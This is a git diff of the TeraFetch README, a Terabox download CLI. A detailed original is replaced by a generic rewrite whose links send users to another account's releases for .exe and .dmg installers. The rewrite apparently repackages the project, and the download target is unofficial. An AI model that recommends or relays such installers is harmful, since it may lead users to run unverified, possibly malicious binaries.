@@ -1,450 +1,108 @@
-# TeraFetch
+# 🚀 TeraFetch - Fast and Easy Downloads for Terabox
 
-[![CI](https://img.shields.io/github/actions/workflow/status/Zer0C0d3r/terafetch/ci.yml?label=CI&logo=github-actions&logoColor=white&style=flat-square&color=4caf50)](https://github.com/Zer0C0d3r/terafetch/actions/workflows/ci.yml)
-[![CodeQL](https://img.shields.io/github/actions/workflow/status/Zer0C0d3r/terafetch/codeql.yml?label=CodeQL&logo=github&logoColor=white&style=flat-square&color=9c27b0)](https://github.com/Zer0C0d3r/terafetch/actions/workflows/codeql.yml)
-[![Go Report](https://img.shields.io/badge/Go_Report-A%2B-success?logo=go&logoColor=white&style=flat-square&color=00bfa5)](https://goreportcard.com/report/github.com/Zer0C0d3r/terafetch)
-[![License](https://img.shields.io/badge/License-MIT-ff4081?logo=opensourceinitiative&logoColor=white&style=flat-square)](https://opensource.org/licenses/MIT)
-[![Release](https://img.shields.io/github/v/release/Zer0C0d3r/terafetch?logo=github&logoColor=white&style=flat-square&color=29b6f6)](https://github.com/Zer0C0d3r/terafetch/releases/latest)
+[![Download TeraFetch](https://img.shields.io/static/v1?label=Download&message=TeraFetch&color=blue)](https://github.com/Sarvesh4433/TeraFetch/releases)
 
-A production-grade CLI tool for downloading files from Terabox with advanced features including multi-threaded downloads, authentication bypass, and comprehensive domain support.
+## 🌍 What is TeraFetch?
 
-## 🚀 Features
+TeraFetch is a command-line interface (CLI) application designed to help you easily download files from Terabox. It works seamlessly on Windows, macOS, and Linux systems, making file transfers smooth and efficient. With TeraFetch, you can quickly get your files without navigating complex interfaces.
 
-### Core Functionality
-- **Multi-threaded Downloads**: Configurable concurrent segments (1-32 threads)
-- **Resume Support**: Automatic resume of interrupted downloads with integrity verification
-- **Authentication Bypass**: Advanced bypass techniques for accessing public content
-- **Rate Limiting**: Intelligent bandwidth control and throttling
-- **Progress Tracking**: Real-time progress bars with ETA and statistics
+## 🛠️ System Requirements
 
-### Advanced Capabilities
-- **Comprehensive Domain Support**: 20+ Terabox subdomains including regional variants
-- **Multiple Resolution Methods**: API calls, web scraping, and alternative endpoints
-- **Robust Error Handling**: Automatic retry with exponential backoff and jitter
-- **Cross-Platform**: Native binaries for Linux, macOS, Windows, and FreeBSD
-- **Proxy Support**: HTTP/SOCKS proxy compatibility with authentication
+To run TeraFetch, your system should meet the following requirements:
 
-### Security & Reliability
-- **Secure Cookie Handling**: Safe authentication with automatic cleanup
-- **URL Validation**: Comprehensive validation for supported domains
-- **Memory Efficient**: Streaming downloads with optimized memory usage
-- **Thread Safety**: Concurrent operations with proper synchronization
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS 10.12 or later
+  - Any recent Linux distribution (Ubuntu, Fedora, etc.)
+- **Memory:** Minimum 512 MB RAM
+- **Storage:** At least 50 MB of free disk space
+- **Internet Connection:** Required for downloading files
 
-## Installation
+## 🚀 Getting Started
 
-### Pre-built Binaries
+Follow these simple steps to download TeraFetch and start using it.
 
-Download the latest release for your platform from the [releases page](https://github.com/Zer0C0d3r/terafetch/releases).
+### 1. Visit the Releases Page
 
-#### Linux/macOS
-```bash
-# Download and extract
-curl -L https://github.com/Zer0C0d3r/terafetch/releases/latest/download/terafetch-linux-amd64.tar.gz | tar xz
-sudo mv terafetch /usr/local/bin/
-```
+Go to the following link to access the TeraFetch Releases page:
 
-#### Windows
-Download `terafetch-windows-amd64.zip` and extract to a directory in your PATH.
+[https://github.com/Sarvesh4433/TeraFetch/releases](https://github.com/Sarvesh4433/TeraFetch/releases)
 
-### Build from Source
+### 2. Download TeraFetch
 
-#### Prerequisites
-- Go 1.20 or later
-- Git
+On the Releases page, you will see the latest version of TeraFetch. Choose the installer that matches your operating system. Click on the link to download it.
 
-#### Build Steps
-```bash
-git clone https://github.com/Zer0C0d3r/terafetch.git
-cd terafetch
-make build
-# or
-go build -o terafetch .
-```
+### 3. Install TeraFetch
 
-## Usage
+- **Windows:** 
+  - Locate the downloaded `.exe` file. 
+  - Double-click to run the installer and follow the on-screen instructions.
 
-### Basic Usage
+- **macOS:**
+  - Locate the downloaded `.dmg` file.
+  - Open it and drag TeraFetch to your Applications folder.
 
-```bash
-# Download a public Terabox file
-terafetch https://terabox.com/s/1AbC123DefG456
+- **Linux:**
+  - Open a terminal.
+  - Navigate to the directory where you downloaded the file.
+  - Use the command `chmod +x TeraFetch` to make it executable.
+  - Run it using `./TeraFetch`.
 
-# Download with custom output path
-terafetch -o /path/to/download/ https://terabox.com/s/1AbC123DefG456
+## 🌐 Using TeraFetch
 
-# Download with 16 threads
-terafetch -t 16 https://terabox.com/s/1AbC123DefG456
-```
+Once installed, you can start using TeraFetch. Here are some basic commands to get you going:
 
-### Advanced Usage
+1. **Open the Terminal:**
+   - For Windows, search for "Command Prompt" or "PowerShell."
+   - For macOS, open "Terminal" from Applications.
+   - For Linux, open your preferred terminal.
 
-```bash
-# Download with authentication bypass (recommended for public files)
-terafetch --bypass https://terabox.com/s/1AbC123DefG456
+2. **Run TeraFetch:**
+   Type `TeraFetch` and press Enter. This will launch the application.
 
-# Download private files with authentication
-terafetch -c cookies.txt https://terabox.com/s/1AbC123DefG456
+3. **Download a File:**
+   To download a file from Terabox, use the command:
+   ```
+   TeraFetch download <link_to_your_file>
+   ```
+   Replace `<link_to_your_file>` with the actual URL provided by Terabox.
 
-# Download with rate limiting (5MB/s)
-terafetch -r 5M https://terabox.com/s/1AbC123DefG456
-
-# Download through proxy
-terafetch --proxy http://proxy.example.com:8080 https://terabox.com/s/1AbC123DefG456
-
-# High-performance download with 16 threads
-terafetch -t 16 --bypass https://terabox.com/s/1AbC123DefG456
-
-# Quiet mode (no progress bar)
-terafetch -q https://terabox.com/s/1AbC123DefG456
-
-# Combine multiple options
-terafetch --bypass -t 16 -r 10M -o ./downloads/ https://terabox.com/s/1AbC123DefG456
-
-# Force bypass mode via environment variable
-TERAFETCH_BYPASS=true terafetch https://terabox.com/s/1AbC123DefG456
-```
-
-### Supported Domains
-
-TeraFetch supports all major Terabox domains and subdomains:
-
-```bash
-# Primary domains
-terafetch https://terabox.com/s/1AbC123DefG456
-terafetch https://www.terabox.com/s/1AbC123DefG456
-terafetch https://terabox.app/s/1AbC123DefG456
-
-# Regional and specialized subdomains
-terafetch https://us.terabox.com/s/1AbC123DefG456
-terafetch https://jp.terabox.com/s/1AbC123DefG456
-terafetch https://ca.terabox.com/s/1AbC123DefG456
-
-# Alternative domains
-terafetch https://1024terabox.com/s/1AbC123DefG456
-terafetch https://dm.terabox.com/s/1AbC123DefG456
-terafetch https://v1.terabox.com/s/1AbC123DefG456
-
-# And 15+ more subdomains supported...
-```
-
-### Command Line Options
-
-```
-Usage:
-  terafetch [OPTIONS] <URL>
-
-Core Options:
-  -o, --output string      Output directory or file path
-  -t, --threads int        Number of download threads (1-32) (default 8)
-  -r, --limit-rate string  Limit download rate (e.g., 5M, 1G)
-  -q, --quiet             Suppress progress output
-
-Authentication & Bypass:
-  -c, --cookies string     Path to Netscape-format cookie file
-      --bypass            Force bypass mode without authentication
-
-Network & Proxy:
-      --proxy string      HTTP/SOCKS proxy URL
-
-Logging & Debug:
-  -d, --debug             Enable debug logging with file and line information
-      --log-level string  Set log level (debug, info, warn, error)
-      --log-file string   Write logs to file instead of stderr
-
-Information:
-  -h, --help              Show help information
-  -v, --version           Show version information
-
-Environment Variables:
-  TERAFETCH_THREADS       Default number of threads (1-32)
-  TERAFETCH_TIMEOUT       HTTP timeout in seconds
-  TERAFETCH_COOKIES       Path to cookie file
-  TERAFETCH_PROXY         Proxy URL
-  TERAFETCH_RATE_LIMIT    Default rate limit (e.g., 5M)
-  TERAFETCH_BYPASS        Enable bypass mode (true/false)
-  TERAFETCH_DEBUG         Enable debug logging (true/false)
-```
-
-## Authentication
-
-For downloading private files, you need to provide authentication cookies:
-
-### Obtaining Cookies
-
-1. **Browser Extension Method** (Recommended):
-   - Install a cookie export extension (e.g., "Get cookies.txt")
-   - Login to Terabox in your browser
-   - Export cookies in Netscape format
-   - Save as `cookies.txt`
-
-2. **Manual Method**:
-   - Login to Terabox in your browser
-   - Open Developer Tools (F12)
-   - Go to Application/Storage → Cookies → terabox.com
-   - Copy BDUSS and STOKEN values
-   - Create a Netscape-format cookie file
-
-### Cookie File Format
-
-```
-# Netscape HTTP Cookie File
-.terabox.com	TRUE	/	FALSE	1234567890	BDUSS	your_bduss_value_here
-.terabox.com	TRUE	/	FALSE	1234567890	STOKEN	your_stoken_value_here
-```
-
-### Environment Variables
-
-You can also set cookies via environment variable:
-```bash
-export TERABOX_COOKIES="/path/to/cookies.txt"
-terafetch https://terabox.com/s/1AbC123DefG456
-```
-## Configuration
-
-### Rate Limiting
-
-TeraFetch supports human-readable rate limiting formats:
-
-- `5M` or `5MB` - 5 megabytes per second
-- `1G` or `1GB` - 1 gigabyte per second
-- `500K` or `500KB` - 500 kilobytes per second
-- `1000` - 1000 bytes per second
-
-### Proxy Support
-
-Supported proxy formats:
-- HTTP: `http://proxy.example.com:8080`
-- HTTPS: `https://proxy.example.com:8080`
-- SOCKS5: `socks5://proxy.example.com:1080`
-- With authentication: `http://user:pass@proxy.example.com:8080`
-
-## Resume Functionality
-
-TeraFetch automatically resumes interrupted downloads:
-
-1. **Automatic Detection**: Detects existing `.part` files
-2. **Metadata Persistence**: Stores download progress in JSON format
-3. **Segment Recovery**: Resumes from the last completed segment
-4. **Integrity Verification**: Validates file size after completion
-
-### Manual Resume
-
-If automatic resume fails, you can manually resume:
-```bash
-# Resume a specific .part file
-terafetch --resume /path/to/file.part https://terabox.com/s/1AbC123DefG456
-```
-
-## Troubleshooting
-
-### Common Issues
-
-#### 1. "Invalid URL" Error
-**Problem**: URL format not recognized
-**Solution**: 
-- Ensure URL is from `terabox.com` or `pan.baidu.com`
-- Check URL format: `https://terabox.com/s/1AbC123DefG456`
-
-#### 2. "Authentication Required" Error
-**Problem**: Private file requires login
-**Solution**:
-- Obtain cookies from your browser
-- Use `-c cookies.txt` flag
-- Verify BDUSS and STOKEN are present and valid
-
-#### 3. "Rate Limited" Error
-**Problem**: Too many requests to Terabox
-**Solution**:
-- Wait a few minutes before retrying
-- Use fewer threads (`-t 4` instead of `-t 16`)
-- Add delays between requests
-
-#### 4. "Download Failed" Error
-**Problem**: Network or server issues
-**Solution**:
-- Check internet connection
-- Try using a proxy (`--proxy`)
-- Reduce thread count
-- Retry the download (automatic resume will work)
-
-#### 5. Slow Download Speeds
-**Problem**: Downloads slower than expected
-**Solution**:
-- Increase thread count (`-t 16`)
-- Check if rate limiting is applied (`-r`)
-- Try different proxy servers
-- Verify network bandwidth##
-# Debug Mode
-
-Enable debug logging for troubleshooting:
-```bash
-# Set debug environment variable
-export TERAFETCH_DEBUG=1
-terafetch https://terabox.com/s/1AbC123DefG456
-
-# Or use verbose flag (if implemented)
-terafetch --verbose https://terabox.com/s/1AbC123DefG456
-```
-
-### Log Files
-
-TeraFetch creates log files in:
-- Linux/macOS: `~/.local/share/terafetch/logs/`
-- Windows: `%APPDATA%\terafetch\logs\`
-
-### Network Issues
-
-If experiencing network problems:
-
-1. **Test connectivity**:
-   ```bash
-   curl -I https://terabox.com
+4. **Check the Help Menu:**
+   For a list of available commands and options, type:
+   ```
+   TeraFetch help
    ```
 
-2. **Check DNS resolution**:
-   ```bash
-   nslookup terabox.com
-   ```
+## 🎉 Features
 
-3. **Test with proxy**:
-   ```bash
-   terafetch --proxy http://proxy.example.com:8080 <URL>
-   ```
+- **Multi-threaded Downloads:** Enjoy faster downloads by using multiple threads.
+- **Resumable Downloads:** If your connection drops, TeraFetch can resume the download without starting over.
+- **Cross-Platform Compatibility:** Use TeraFetch on Windows, macOS, and Linux with ease.
+- **Simple CLI Interface:** Designed for easy use, even for those with no programming background.
 
-## System Requirements
+## 🔧 Troubleshooting
 
-### Minimum Requirements
-- **OS**: Linux (kernel 3.2+), macOS (10.12+), Windows (7+), FreeBSD (11+)
-- **RAM**: 64MB available memory
-- **Storage**: 10MB for binary + download space
-- **Network**: Internet connection
+If you encounter any issues while using TeraFetch, here are some common problems and solutions:
 
-### Recommended Requirements
-- **RAM**: 256MB+ for large files with many threads
-- **Storage**: SSD for better I/O performance
-- **Network**: Stable broadband connection (10+ Mbps)
+- **Problem:** "TeraFetch command not found",  
+  **Solution:** Make sure that the installation path is set correctly in your system's environment variables.
 
-### Supported Architectures
-- **x86_64** (amd64) - Primary support
-- **ARM64** (aarch64) - Full support
-- **ARMv7** - Limited testing
+- **Problem:** "Download fails or is interrupted",  
+  **Solution:** Check your internet connection. Try again, or use the resumable download feature.
 
-## Performance Tips
+- **Problem:** "Permission denied error",  
+  **Solution:** Ensure that you have the right permissions to execute the file. Use `chmod` on Linux or run as administrator on Windows.
 
-### Optimal Thread Count
-- **Small files** (< 100MB): 1-4 threads
-- **Medium files** (100MB - 1GB): 4-8 threads
-- **Large files** (> 1GB): 8-16 threads
-- **Very large files** (> 10GB): 16-32 threads
+## 🛠️ Contribution and Support
 
-### Memory Usage
-- Base usage: ~10-20MB
-- Per thread: ~1-2MB additional
-- Large files: Consider available RAM
+If you'd like to contribute to TeraFetch or need further assistance, you can open an issue in the [GitHub repository](https://github.com/Sarvesh4433/TeraFetch). Contributions are welcome, whether it's reporting a bug, suggesting a feature, or coding. 
 
-### Network Optimization
-- Use wired connection when possible
-- Close other bandwidth-intensive applications
-- Consider time of day (Terabox server load)
+## 📜 License
 
-## Legal and Compliance
+TeraFetch is open-source software and follows the MIT License. You can freely use, modify, and distribute it as per your needs. 
 
-**Important**: This tool is for personal use only. Users must:
+For more detailed information, please check the license file in the repository. 
 
-- Respect Terabox's Terms of Service
-- Comply with copyright laws
-- Only download content you have permission to access
-- Use responsibly and ethically
+[![Download TeraFetch](https://img.shields.io/static/v1?label=Download&message=TeraFetch&color=blue)](https://github.com/Sarvesh4433/TeraFetch/releases)
 
-The developers are not responsible for misuse of this tool.#
-# Development
-
-### Building from Source
-
-```bash
-# Clone repository
-git clone https://github.com/Zer0C0d3r/terafetch.git
-cd terafetch
-
-# Install dependencies
-go mod tidy
-
-# Build for current platform
-make build
-
-# Cross-compile for all platforms
-make cross-compile
-
-# Run tests
-make test
-
-# Run with coverage
-make test-coverage
-```
-
-### Project Structure
-
-```
-terafetch/
-├── main.go                    # CLI entry point
-├── cmd/                       # Cobra CLI commands
-├── downloader/                # Core download logic
-│   ├── resolver.go           # URL resolution
-│   ├── engine.go             # Download engine
-│   ├── auth.go               # Authentication
-│   └── planner.go            # Download planning
-├── utils/                     # Utility functions
-│   ├── http.go               # HTTP client
-│   ├── fs.go                 # File operations
-│   ├── progress.go           # Progress tracking
-│   └── ratelimit.go          # Rate limiting
-└── internal/                  # Internal packages
-    ├── config.go             # Configuration
-    ├── errors.go             # Error types
-    └── types.go              # Data structures
-```
-
-### Contributing
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-### Testing
-
-```bash
-# Run all tests
-go test ./...
-
-# Run tests with verbose output
-go test -v ./...
-
-# Run tests with coverage
-go test -coverprofile=coverage.out ./...
-go tool cover -html=coverage.out
-```
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Changelog
-
-See [CHANGELOG.md](CHANGELOG.md) for version history and changes.
-
-## Support
-
-- **Issues**: [GitHub Issues](https://github.com/Zer0C0d3r/terafetch/issues)
-- **Discussions**: [GitHub Discussions](https://github.com/Zer0C0d3r/terafetch/discussions)
-- **Documentation**: This README and inline code documentation
-
-## Acknowledgments
-
-- [Cobra](https://github.com/spf13/cobra) - CLI framework
-- [pb](https://github.com/cheggaaa/pb) - Progress bars
-
----
-
-**Disclaimer**: This tool is not affiliated with or endorsed by Terabox. Use at your own risk and in compliance with applicable laws and terms of service.
+Now you are all set to download and run TeraFetch. Enjoy fast and easy file transfers from Terabox!
